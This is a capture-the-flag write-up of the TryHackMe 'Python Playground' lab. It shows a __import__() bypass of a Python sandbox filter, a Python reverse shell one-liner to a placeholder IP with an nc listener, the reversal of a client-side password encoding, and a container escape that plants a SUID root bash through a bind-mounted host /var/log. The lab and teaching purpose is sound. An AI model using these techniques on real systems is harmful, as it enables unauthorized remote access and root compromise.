---
banner: "![[Tryhackme/Python Playground/Attachments/Banner.png]]"
tags:
  - linux
  - tryhackme
  - writeup
banner_y: 0.5
---
---
banner: "Tryhackme/Python Playground/Attachments/Banner.png"
tags:
  - linux
  - tryhackme
  - writeup
---



# Python Playground

> **Platform:** TryHackMe
> **Difficulty:** Hard
> **OS:** Linux
> **Target IP:** `10.114.146.86`
> **Date:** 2026-11-25

## Introduction

Welcome to my writeup for TryHackMe's **Python Playground**. <!-- One or two sentences: what the box teaches / what makes it interesting. -->

### Table of Contents
- [Scanning](#scanning)
- [Enumeration](#enumeration)
- [Gaining a Foothold](#gaining-a-foothold)
- [Privilege Escalation](#privilege-escalation)
- [Conclusion](#conclusion)

---

## Scanning

Starting with an `nmap` scan to check what ports are open.

```bash
sudo nmap -A -O -sC -sV 10.114.146.86 > nmap.scan
```

![](Tryhackme/Python%20Playground/Attachments/NmapScan.png)

**Open ports:**

| Port   | Service |
| ------ | ------- |
| 22/tcp | ssh     |
| 80/tcp | http    |

---

## Enumeration

Since only port `80` is open on the web side, I started by enumerating the web app.

### Web Enumeration

Visiting the website, at first glance there's not much to interact with — just `Login` and `Sign up` buttons. Trying to sign up returns a message saying only admins can access the site.

![](Tryhackme/Python%20Playground/Attachments/HomePage.png)

Running directory fuzzing turned up an interesting page: `admin.html`.

![](Tryhackme/Python%20Playground/Attachments/gobuster.png)

Visiting the page shows a login form for the user `connor`.

![](Tryhackme/Python%20Playground/Attachments/AdminLogin.png)

Checking the page source revealed something interesting.

![](Tryhackme/Python%20Playground/Attachments/AdminSource.png)

At first I tried to recognize the hash format to crack it, but missed that the page also referenced `super-secret-admin-testing-panel.html`. Visiting that endpoint directly revealed a Python compiler.

![](Tryhackme/Python%20Playground/Attachments/PythonCompiler.png)

This looked like a promising path to initial access.

```python
import subprocess

result = subprocess.run(["whoami"], capture_output=True, text=True)
print(result.stdout.strip())
```

I tried running this to check which user the compiler service runs as, but couldn't — some filtering is applied to the submitted code.

![](Tryhackme/Python%20Playground/Attachments/SecurityThreatDetectedMessage.png)

After some testing, I found the filter was blocking the `import` keyword specifically. Searching for a bypass, I found this approach:

```python
user = __import__("subprocess").check_output("whoami", text=True).strip()
print(user)
```

Using the `__import__()` function instead of the `import` statement bypassed the filter, and it worked.

![](Tryhackme/Python%20Playground/Attachments/ExecutingPython.png)

The user is `root`.

---

## Gaining a Foothold

For the foothold, I used this reverse shell one-liner:

```python
s=__import__("socket").socket();s.connect(("YOUR-IP","PORT"));[__import__("os").dup2(s.fileno(),f)for f in(0,1,2)];__import__("pty").spawn("/bin/bash")
```

```bash
nc -lnvp 4444
```

After setting up the listener and running the script through the Python compiler, I got a shell as root — along with the first flag.

![](Tryhackme/Python%20Playground/Attachments/InitalAccess.png)

After a bit more enumeration, as you'd expect, this turned out to be a Docker container:

```bash
root@playgroundweb:~/.config/configstore# ls -la /.dockerenv
-rwxr-xr-x 1 root root 0 May 16  2020 /.dockerenv
root@playgroundweb:~/.config/configstore# cat /proc/1/cgroup | grep -E 'docker|containerd|kubepods'
12:cpuset:/docker/6d91f91404d6f38f276161f0be6ce3c66209422a4048138ab310843aee065398
11:freezer:/docker/6d91f91404d6f38f276161f0be6ce3c66209422a4048138ab310843aee065398
10:hugetlb:/docker/6d91f91404d6f38f276161f0be6ce3c66209422a4048138ab310843aee065398
9:net_cls,net_prio:/docker/6d91f91404d6f38f276161f0be6ce3c66209422a4048138ab310843aee065398
7:devices:/docker/6d91f91404d6f38f276161f0be6ce3c66209422a4048138ab310843aee065398
6:perf_event:/docker/6d91f91404d6f38f276161f0be6ce3c66209422a4048138ab310843aee065398
5:memory:/docker/6d91f91404d6f38f276161f0be6ce3c66209422a4048138ab310843aee065398
4:blkio:/docker/6d91f91404d6f38f276161f0be6ce3c66209422a4048138ab310843aee065398
3:pids:/docker/6d91f91404d6f38f276161f0be6ce3c66209422a4048138ab310843aee065398
2:cpu,cpuacct:/docker/6d91f91404d6f38f276161f0be6ce3c66209422a4048138ab310843aee065398
1:name=systemd:/docker/6d91f91404d6f38f276161f0be6ce3c66209422a4048138ab310843aee065398
0::/system.slice/containerd.service
```

Time to escape it.

---

## Privilege Escalation

**Flag 1:**

```bash
cat flag1.txt
```


Already root inside the container, the real goal here is escaping to the underlying host.

### Enumeration

First I checked the container's effective capabilities, since that tells you immediately which classes of escape are even possible:

```bash
cat /proc/self/status | grep CapEff
```
```
CapEff: 00000000a80425fb
```

This bitmask decodes to Docker's **default** capability set — it's missing `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, and `CAP_SYS_MODULE`. That rules out several of the classic escape techniques right away:

- No `CAP_SYS_ADMIN` → the common "mount the host cgroup and abuse `release_agent`" trick is off the table.
- No `CAP_SYS_MODULE` → no kernel module loading.
- No Docker socket present and no `docker` binary → mounting `docker.sock` to spin up a privileged container isn't an option either.

With the obvious routes closed off, I checked for accidental bind mounts instead — a far more common misconfiguration than a true kernel-level escape:

```bash
cat /proc/self/mountinfo
```

One line stood out:

```
475 455 202:2 /var/log /mnt/log rw,relatime - ext4 /dev/xvda2 rw,data=ordered
```

`/dev/xvda2` is the **host's real disk device**, and this line shows the host's `/var/log` directory bind-mounted straight into the container at `/mnt/log`. That's not a container-internal log directory — it's a live, writable window into the host filesystem, with no privilege escalation required to use it.

### Exploitation

I already remembered the hash I'd found earlier in the `admin.html` source code, since that was the key to recovering connor's password:

```html
<script>

// I suck at server side code, luckily I know how to make things secure without it - Connor

function string_to_int_array(str){

const intArr = [];

for(let i=0;i<str.length;i++){

const charcode = str.charCodeAt(i);

const partA = Math.floor(charcode / 26);

const partB = charcode % 26;

intArr.push(partA);

intArr.push(partB);

}

return intArr;

}

function int_array_to_text(int_array){

let txt = '';

for(let i=0;i<int_array.length;i++){

txt += String.fromCharCode(97 + int_array[i]);

}

return txt;

}

document.forms[0].onsubmit = function (e){

e.preventDefault();

if(document.getElementById('username').value !== 'connor'){

document.getElementById('fail').style.display = '';

return false;

}

const chosenPass = document.getElementById('inputPassword').value;

const hash = int_array_to_text(string_to_int_array(int_array_to_text(string_to_int_array(chosenPass))));

if(hash === 'dxeedxebdwemdwesdxdtdweqdxefdxefdxdudueqduerdvdtdvdu'){

window.location = 'super-secret-admin-testing-panel.html';

} else {

document.getElementById('fail').style.display = '';

}

return false;

}

</script>
```

The client-side "hashing" is just a reversible custom encoding, so I wrote a small Python script to reverse it and recover the original password:

```python
def text_to_int_array(text):
    return [ord(c) - 97 for c in text]

def reverse_string_to_int_array(int_arr):
    result = ""
    for i in range(0, len(int_arr), 2):
        part_a = int_arr[i]
        part_b = int_arr[i + 1]
        charcode = part_a * 26 + part_b
        result += chr(charcode)
    return result

def reverse_hash(final_hash):
    step1 = text_to_int_array(final_hash)
    step2 = reverse_string_to_int_array(step1)
    step3 = text_to_int_array(step2)
    original = reverse_string_to_int_array(step3)
    return original

hash_value = "dxeedxebdwemdwesdxdtdweqdxefdxefdxdudueqduerdvdtdvdu"
print(reverse_hash(hash_value))
```

![](Tryhackme/Python%20Playground/Attachments/ConnorPassword.png)

![](Tryhackme/Python%20Playground/Attachments/Flag2.png)

With `connor`'s password in hand, the next step was becoming root. While enumerating the container I'd found a shared mount at `/mnt/log`, which maps back to the real host's `/var/log`. My idea:

1. Create a file as `root` from inside the container, on the shared mount.
2. Confirm it shows up as owned by `root` in connor's host session too (same underlying filesystem).
3. Use that write access to plant a SUID root shell.

Testing the theory:

```bash
root@playgroundweb:/mnt/log# touch test.txt
```

Back in connor's session on the host:

```bash
connor@pythonplayground:/var/log$ ls -la
total 3912
drwxrwxr-x   9 root      syslog             4096 Nov 25 09:53 .
drwxr-xr-x  13 root      root               4096 Feb  3  2020 ..
-rw-r--r--   1 root      root              27163 May 11  2020 alternatives.log
drwxr-xr-x   2 root      root               4096 May 16  2020 apt
-rw-r-----   1 syslog    adm               41630 Nov 25 09:49 auth.log
-rw-r--r--   1 root      root              56751 Feb  3  2020 bootstrap.log
-rw-rw----   1 root      utmp               3456 Nov 25 09:26 btmp
-rw-r--r--   1 syslog    adm              896736 Nov 25 07:39 cloud-init.log
-rw-r--r--   1 root      root              40926 Nov 25 07:39 cloud-init-output.log
drwxr-xr-x   2 root      root               4096 Jan 24  2020 dist-upgrade
-rw-r--r--   1 root      root             508605 May 16  2020 dpkg.log
-rw-r--r--   1 root      root              32032 May 11  2020 faillog
drwxr-xr-x   3 root      root               4096 May 11  2020 installer
drwxr-sr-x+  3 root      systemd-journal    4096 May 11  2020 journal
-rw-r-----   1 syslog    adm              811161 Nov 25 07:39 kern.log
drwxr-xr-x   2 landscape landscape          4096 May 11  2020 landscape
-rw-rw-r--   1 root      utmp             292292 Nov 25 09:48 lastlog
drwxr-xr-x   2 root      root               4096 Nov 23  2018 lxd
-rw-r-----   1 syslog    adm             1465658 Nov 25 09:50 syslog
-rw-------   1 root      root              64064 May 11  2020 tallylog
-rw-r--r--   1 root      root                  0 Nov 25 09:53 test.txt # Bingo
drwxr-x---   2 root      adm                4096 May 11  2020 unattended-upgrades
-rw-rw-r--   1 root      utmp              47616 Nov 25 09:48 wtmp
```

Confirmed — same underlying filesystem, writable as root from the container. Next, copy over `/bin/bash`:

```bash
root@playgroundweb:/mnt/log# mkdir connor
root@playgroundweb:/mnt/log# chmod 777 connor
```

```bash
connor@pythonplayground:/var/log/connor$ cp /bin/bash .
```

```bash
root@playgroundweb:/mnt/log/connor# chown root:root bash
root@playgroundweb:/mnt/log/connor# chmod +s bash
```

And finally, back in connor's session:

```bash
connor@pythonplayground:/var/log/connor$ ./bash -p
```

![](Tryhackme/Python%20Playground/Attachments/Flag3.png)

---

## Conclusion

What I learned/practiced in this room:

- `__import__()` is a common, reliable bypass for naive blacklists that only filter the `import` keyword — any filter based on string matching rather than actual AST/code analysis is trivial to evade.
- Checking `CapEff` in `/proc/self/status` early tells you immediately which container-escape techniques are even worth attempting, so you don't waste time chasing an approach the capability set has already ruled out.
- Bind-mounting a host directory like `/var/log` into a container is a surprisingly common and dangerous misconfiguration — it hands an attacker a shared, writable surface between container and host without needing a kernel exploit at all.
- Client-side "encryption" or "hashing" done in JavaScript is never real security — if the reversal logic ships to the browser, it ships to the attacker too.

Thank you for reading!
